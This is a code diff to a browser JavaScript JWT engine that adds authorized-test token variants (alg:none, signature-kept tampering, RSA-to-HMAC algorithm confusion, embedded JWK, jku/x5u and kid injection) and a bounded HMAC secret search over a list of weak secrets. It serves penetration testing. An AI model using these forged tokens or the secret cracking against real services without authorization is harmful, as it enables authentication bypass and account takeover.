@@ -1,11 +1,13 @@
 /* ==========================================================================
-   CyberBuddy — JWT engine: decode, inspect, verify (JWT-01) and edit,
-   generate, sign (JWT-02)
+   CyberBuddy — JWT engine: decode, inspect, verify (JWT-01), edit,
+   generate, sign (JWT-02) and authorized-test variants + bounded secret
+   search (JWT-03)
 
-   Pure, DOM-free functions shared by the browser controller and the Node
-   unit tests in test_engines.py. Nothing here touches the network, storage
-   or history. Cryptography uses the standard Web Crypto API
-   (globalThis.crypto.subtle), available in all modern browsers and Node 22+.
+   Pure, DOM-free functions shared by the browser controller, the secret
+   test worker and the Node unit tests in test_engines.py. Nothing here
+   touches the network, storage or history. Cryptography uses the standard
+   Web Crypto API (globalThis.crypto.subtle), available in all modern
+   browsers and Node 22+.
 
    JWT-01 scope (strict):
      - compact JWS decoding (header/payload/signature); JWE is rejected;
@@ -20,8 +22,16 @@
        material (d) — public keys can never sign;
      - local RSA test-key-pair generation for throwaway authorized testing;
      - a semantic original-vs-modified claim diff.
-   The engine still never edits-then-sends: no fetch of a JWKS URL, no
-   secret testing, no network/storage, and alg:none stays rejected.
+   JWT-03 scope:
+     - authorized-test variant templates built on the analyzed token
+       (alg:none, claim tamper + re-sign, algorithm confusion with a
+       pasted public key, embedded JWK, jku/x5u, kid mutation) — the tool
+       never sends them;
+     - a bounded HMAC secret search (HS256/384/512 only) that runs in a
+       Web Worker with progress, cancel and time/candidate limits.
+   The engine never sends a JWT anywhere: no fetch of a JWKS URL, no
+   target requests, no network/storage, and alg:none stays rejected by
+   parseToken and signToken (it exists only as a labelled template).
 
    Accuracy rules enforced here:
      - we never trust the token's "alg" header to choose the verifier; the
@@ -31,7 +41,8 @@
        public keys (PEM/JWK/JWKS) for verify and private keys for sign —
        this blocks algorithm-confusion in both directions;
      - decoding is reported separately from signature/claim verification;
-       a signed token is a TEST TOKEN until the target honors it.
+       a signed token is a TEST TOKEN and a variant is a TEST TEMPLATE
+       until the target honors them.
    ========================================================================== */
 "use strict";
 
@@ -536,6 +547,245 @@
     return out;
   }
 
+  /* ========================================================================
+     JWT-03 — authorized-test variant templates & bounded secret search
+     ======================================================================== */
+
+  /* Small built-in candidate list for bounded secret testing — a starter
+     set, not a bundled wordlist (a real wordlist is uploaded by the
+     analyst). */
+  var BUILTIN_SECRET_CANDIDATES = [
+    "secret", "password", "changeme", "changeit", "admin", "administrator",
+    "root", "test", "testing", "jwt", "jwt-secret", "jwtsecret",
+    "secret-key", "secretkey", "mysecret", "supersecret", "topsecret",
+    "key", "token", "123456", "12345678", "1234567890", "qwerty",
+    "letmein", "default", "privatekey", "publickey", "HS256", "HS384",
+    "HS512", "abc123", "passw0rd"
+  ];
+
+  function cloneJson(v) {
+    return JSON.parse(JSON.stringify(v));
+  }
+
+  function assertJsonObject(v, name) {
+    if (!v || typeof v !== "object" || Array.isArray(v)) {
+      throw new Error(name + " must be a JSON object");
+    }
+  }
+
+  /* Parse a claim value typed by an analyst: JSON when it parses
+     (numbers, booleans, null, arrays, objects), otherwise a string. */
+  function claimValue(v) {
+    if (typeof v !== "string") return v;
+    var t = v.trim();
+    if (t === "") return "";
+    try { return JSON.parse(t); } catch (e) { return v; }
+  }
+
+  /* alg:none template: the header's alg is forced to none and the
+     signature segment is empty. This exists ONLY as an explicitly labelled
+     authorized-test template — the parse and sign paths keep rejecting
+     alg:none. */
+  function unsignedToken(header, payload) {
+    assertJsonObject(header, "Header");
+    assertJsonObject(payload, "Payload");
+    var h = cloneJson(header);
+    h.alg = "none";
+    var p = cloneJson(payload);
+    var signingInput = encodePart(h) + "." + encodePart(p);
+    return { token: signingInput + ".", header: h, payload: p, signingInput: signingInput };
+  }
+
+  /* Tamper template: new header/payload but the ORIGINAL signature is kept.
+     Tests whether the target verifies the signature at all. */
+  function tamperToken(parsed, header, payload) {
+    if (!parsed || !parsed.signature || !parsed.signingInput) {
+      throw new Error("A parsed base token is required");
+    }
+    assertJsonObject(header, "Header");
+    assertJsonObject(payload, "Payload");
+    var h = cloneJson(header);
+    var p = cloneJson(payload);
+    var signingInput = encodePart(h) + "." + encodePart(p);
+    return {
+      token: signingInput + "." + b64urlEncode(parsed.signature),
+      header: h,
+      payload: p,
+      signingInput: signingInput
+    };
+  }
+
+  /* Algorithm-confusion template: HS256-signed with the target's RSA
+     public key text used as the HMAC secret. Only meaningful when the
+     target treats a public key as a shared HMAC secret. The public key is
+     supplied (pasted) by the analyst — never fetched. */
+  function algorithmConfusionToken(parsed, publicKeyPem) {
+    if (!parsed || !parsed.header || !parsed.payload) {
+      return Promise.reject(new Error("A parsed base token is required"));
+    }
+    if (!looksLikePem(publicKeyPem) || !/BEGIN PUBLIC KEY/.test(publicKeyPem)) {
+      return Promise.reject(new Error("The confusion template uses the target's RSA public key (PEM) as the HMAC secret"));
+    }
+    var h = cloneJson(parsed.header);
+    h.alg = "HS256";
+    var p = cloneJson(parsed.payload);
+    var signingInput = encodePart(h) + "." + encodePart(p);
+    return importSecret(algSpec("HS256"), publicKeyPem, ["sign"]).then(function (ck) {
+      return crypto().subtle.sign({ name: "HMAC", hash: { name: "SHA-256" } }, ck, new TextEncoder().encode(signingInput));
+    }).then(function (sig) {
+      return {
+        token: signingInput + "." + b64urlEncode(asUint8(sig)),
+        header: h,
+        payload: p,
+        signingInput: signingInput
+      };
+    });
+  }
+
+  /* The public subset of a private JWK — RSA: n/e, EC: x/y. Used by the
+     embedded-JWK template when the analyst pasted a private JWK. */
+  function publicJwkFromPrivate(jwk) {
+    if (!jwk || typeof jwk !== "object" || !jwk.d) {
+      throw new Error("Key has no private material (d)");
+    }
+    if (jwk.kty === "RSA") {
+      if (!jwk.n || !jwk.e) throw new Error("Incomplete RSA private JWK");
+      return { kty: "RSA", n: jwk.n, e: jwk.e, alg: jwk.alg };
+    }
+    if (jwk.kty === "EC") {
+      if (!jwk.crv || !jwk.x || !jwk.y) throw new Error("Incomplete EC private JWK");
+      return { kty: "EC", crv: jwk.crv, x: jwk.x, y: jwk.y, alg: jwk.alg };
+    }
+    throw new Error("Cannot derive a public JWK from kty " + jwk.kty);
+  }
+
+  var VARIANT_NOTES = {
+    "alg-none": "alg:none, empty signature — tests whether the target accepts an unsigned token.",
+    "tamper": "Claim changed, original signature kept — tests whether the target verifies the signature at all.",
+    "claim-resign": "Claim changed and re-signed with your key — tests whether the target accepts the modified claim.",
+    "alg-confusion": "HS256 signed with the target's public key as the HMAC secret — valid only where the verifier confuses a public key with a shared secret.",
+    "embedded-jwk": "The token carries its own public JWK in the header and is signed with the matching private key — tests header-key trust.",
+    "jku": "Header points at an analyst-controlled jku URL (you host the key set); the tool makes no request to it.",
+    "x5u": "Header points at an analyst-controlled x5u URL (you host the certificate); the tool makes no request to it.",
+    "kid": "Mutated kid header, re-signed with your key — tests whether the target's key selection trusts the kid."
+  };
+
+  /* One entry point for every authorized-test variant template. `parsed`
+     is the analyzed base token. Types:
+       alg-none         opts: {}
+       tamper           opts: {claim, value}        (original signature kept)
+       claim-resign     opts: {claim, value, alg, key}
+       alg-confusion    opts: {publicKeyPem}
+       embedded-jwk     opts: {publicJwk, alg, key}
+       jku / x5u        opts: {url, alg, key}
+       kid              opts: {kid, alg, key}
+     Re-signed variants go through signToken, so every JWT-02 guard
+     (alg pin, no public-key signing, no alg:none) still applies.
+     Resolves {type, token, header, payload, note} or {error}. */
+  function buildVariant(parsed, type, opts) {
+    opts = opts || {};
+    if (!parsed || !parsed.header || !parsed.payload) {
+      return Promise.resolve({ error: "Paste and decode a base token first — variants build on the analyzed token." });
+    }
+    var header = cloneJson(parsed.header);
+    var payload = cloneJson(parsed.payload);
+    var task;
+    try {
+      if (type === "alg-none") {
+        task = Promise.resolve(unsignedToken(header, payload));
+      } else if (type === "tamper") {
+        if (!opts.claim) return Promise.resolve({ error: "Name the claim to modify." });
+        payload[opts.claim] = claimValue(opts.value);
+        task = Promise.resolve(tamperToken(parsed, header, payload));
+      } else if (type === "claim-resign") {
+        if (!opts.claim) return Promise.resolve({ error: "Name the claim to modify." });
+        payload[opts.claim] = claimValue(opts.value);
+        task = signToken(header, payload, opts.key, { alg: opts.alg });
+      } else if (type === "alg-confusion") {
+        task = algorithmConfusionToken(parsed, opts.publicKeyPem);
+      } else if (type === "embedded-jwk") {
+        if (!opts.publicJwk) return Promise.resolve({ error: "The embedded-JWK template needs the public JWK of the signing key." });
+        header.jwk = cloneJson(opts.publicJwk);
+        task = signToken(header, payload, opts.key, { alg: opts.alg });
+      } else if (type === "jku" || type === "x5u") {
+        if (!opts.url) return Promise.resolve({ error: "Supply the URL the template should carry." });
+        header[type] = opts.url;
+        task = signToken(header, payload, opts.key, { alg: opts.alg });
+      } else if (type === "kid") {
+        if (opts.kid == null || opts.kid === "") return Promise.resolve({ error: "Supply the kid value." });
+        header.kid = opts.kid;
+        task = signToken(header, payload, opts.key, { alg: opts.alg });
+      } else {
+        return Promise.resolve({ error: "Unknown variant type: " + type });
+      }
+    } catch (e) {
+      return Promise.resolve({ error: e.message });
+    }
+    return task.then(function (res) {
+      if (!res || res.error) return res;
+      return { type: type, token: res.token, header: res.header, payload: res.payload, note: VARIANT_NOTES[type] || "" };
+    }).catch(function (err) {
+      return { error: err && err.message ? err.message : String(err) };
+    });
+  }
+
+  function timingSafeEqual(a, b) {
+    var d = 0;
+    for (var i = 0; i < a.length; i++) d |= a[i] ^ b[i];
+    return d === 0;
+  }
+
+  /* Bounded HMAC secret search (HS256/384/512 only) — used by the secret
+     test worker. `candidates` is a string array; `shouldContinue` allows
+     cancel/timeout; `onProgress` fires every 250 candidates with
+     {tested, total, found}. Resolves {found, secret, tested, total}.
+     Never performs RSA/EC operations and never touches the network. */
+  function searchHmacSecret(opts) {
+    opts = opts || {};
+    var spec = algSpec(opts.alg);
+    if (!spec || spec.kty !== "oct") {
+      return Promise.reject(new Error("Secret testing covers HS256/384/512 only"));
+    }
+    if (!opts.candidates || !Array.isArray(opts.candidates) || !opts.candidates.length) {
+      return Promise.reject(new Error("candidates must be a non-empty array"));
+    }
+    var target = asUint8(opts.signature);
+    var input = new TextEncoder().encode(opts.signingInput);
+    var c = crypto();
+    var shouldContinue = opts.shouldContinue || function () { return true; };
+    var onProgress = opts.onProgress || function () {};
+    var total = opts.candidates.length;
+    var tested = 0;
+    var found = false;
+    var foundSecret = null;
+
+    function step(i) {
+      if (!shouldContinue()) return Promise.resolve(null);
+      var cand = opts.candidates[i];
+      if (typeof cand !== "string") cand = String(cand);
+      return c.subtle.importKey("raw", new TextEncoder().encode(cand), { name: "HMAC", hash: spec.hash }, false, ["sign"])
+        .then(function (key) {
+          return c.subtle.sign({ name: "HMAC", hash: spec.hash }, key, input);
+        }).then(function (sig) {
+          tested++;
+          var bytes = asUint8(sig);
+          if (bytes.length === target.length && timingSafeEqual(bytes, target)) {
+            found = true;
+            foundSecret = cand;
+          }
+          if (found || (tested % 250) === 0) {
+            onProgress({ tested: tested, total: total, found: found });
+          }
+          if (found || i + 1 >= total) return null;
+          return step(i + 1);
+        });
+    }
+
+    return step(0).then(function () {
+      return { found: found, secret: found ? foundSecret : null, tested: tested, total: total };
+    });
+  }
+
   /* A random jti (UUIDv4-style) for the standard-claim helpers. */
   function randomJti() {
     var c = crypto();
@@ -567,6 +817,13 @@
     exportPublicJwk: exportPublicJwk,
     diffClaims: diffClaims,
     randomJti: randomJti,
+    buildVariant: buildVariant,
+    unsignedToken: unsignedToken,
+    tamperToken: tamperToken,
+    algorithmConfusionToken: algorithmConfusionToken,
+    publicJwkFromPrivate: publicJwkFromPrivate,
+    searchHmacSecret: searchHmacSecret,
+    BUILTIN_SECRET_CANDIDATES: BUILTIN_SECRET_CANDIDATES,
     SUPPORTED_ALGS: SUPPORTED_ALGS
   };
 });
